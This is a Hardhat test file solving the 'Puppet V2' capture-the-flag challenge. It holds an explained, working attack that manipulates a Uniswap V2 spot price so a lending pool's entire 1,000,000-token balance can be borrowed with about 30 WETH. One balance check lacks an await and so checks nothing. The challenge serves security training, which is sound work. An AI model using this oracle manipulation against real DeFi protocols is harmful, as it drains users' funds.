const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    /**
     * @dev
     * 
     * Exploit Overview:
     * 
     * This solution is very similar to the previous challenge in where we
     * manipulate the value of the liquidity pool in our favour during the
     * transactions. 
     * 
     * This time it is using UniSwapV2 which uses WETH instead of ETH to allow
     * for ERC20 -> ERC20 swaps directly. However the puppet contract still
     * uses ETH for deposits so we need to keep that in mind.
     * 
     * We follow the same process as before with a few extra steps. The pool 
     * is initialised with 10 ETH : 100 DVT. Let's perform a swap to deposit our
     * 10,000 DVT to heavily devalue the DVT relative to ETH.
     * 
     * 10 WETH : 10,100 DVT
     * (accounting for the 0.3% fee because it makes a difference)
     * num = (10,000 * 997) * 10
     * den = (100 * 1000) + (10,000 * 997)
     * 
     * WETH payout = num/den ~= 9.90069513406157 WETH
     * 
     * Which leaves the ratio in the pool to be
     * 
     * 10,100 DVT : 0.09930486593843035 WETH
     * 
     * Now let's check how much of a deposit is required for borrowing 1,000,000 DVT
     * with the current pool ratio of
     * 
     * 1,000,000 DVT = 9.832164944399045 WETH
     * 
     * multiplied by 3 due to contract requirements therefore we need
     * 
     * Deposit = 29.496494833197133 WETH
     * 
     * And we have 20 ETH (initial) + ~10 WETH (from swap 10000 DVT) ~= 30 W[ETH] to spend, perfect!
     * 
     * Then we convert our ETH to WETH by depositing directly to the WETH contract. Leavin us with ~30WETH
     * Then finally we approve the lender to spend our WETH and request to borrow the 
     * 1,000,000 DVT by providing ~30 ETH in collatoral.
     * 
     * Then we are left with 
     * ~0 ETH
     * ~0 WETH
     * 1,000,000 DVT
     * 
     * Again assuming a correct value position of 10 ETH : 100 DVT our position has changed from 
     * 
     * Start: 20 ETH + 10000 DVT = 20 ETH + 1000 ETH = 1020 ETH of value
     * END: 0 ETH + 1000000 DVT = 100000 ETH of value
     * 
     * giving us a ~98x return
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attackWeth = this.weth.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackRouter = this.uniswapRouter.connect(attacker);
        const attackLender = this.lendingPool.connect(attacker);

        // Helper function to check balances
        const logBalances = async (address, name) => {
            const ethBal = await ethers.provider.getBalance(address);
            const wethBal  = await attackWeth.balanceOf(address);
            const tknBal = await attackToken.balanceOf(address);

            console.log(`ETH Balance of ${name} is `, ethers.utils.formatEther(ethBal))
            console.log(`WETH Balance of ${name} is `, ethers.utils.formatEther(wethBal))
            console.log(`TKN Balance of ${name} is `, ethers.utils.formatEther(tknBal))
            console.log("")
        }

        await logBalances(attacker.address, "Attacker")

        // Approve DVT transfer
        await attackToken.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        // Swap 10,000 DVT for WETH
        await attackRouter.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE, // transfer exactly 10,000 tokens
            ethers.utils.parseEther("9"), // minimum of 9 WETH return
            [attackToken.address, attackWeth.address], // token addresses
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
        )

        console.log("***SWAPPED 10000 TOKENS FOR WETH***")
        await logBalances(attacker.address, "Attacker")
        await logBalances(this.uniswapExchange.address, "UniSwapExchange")

        // Calculate deposit required and approve the lending contract for that amount;
        const deposit = await attackLender.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Required deposit for all tokens is", ethers.utils.formatEther(deposit));
        await attackWeth.approve(attackLender.address, deposit)

        // Transfer remaining eth to weth (save some for gas) by sending to contract
        const tx = {
            to: attackWeth.address,
            value: ethers.utils.parseEther("19.9")
        }
        await attacker.sendTransaction(tx);

        console.log("***Deposited 19.9 ETH TO WETH***")
        await logBalances(attacker.address, "Attacker")

        // Verify we have enough WETH to make the deposit
        const wethBalance = attackWeth.balanceOf(attacker.address);
        assert(wethBalance >= deposit, "Not enough WETH to take all funds");

        // Request borrow funds
        await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            gasLimit: 1e6
        });

        await logBalances(attacker.address, "Attacker")
        await logBalances(attackLender.address, "Lender")

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});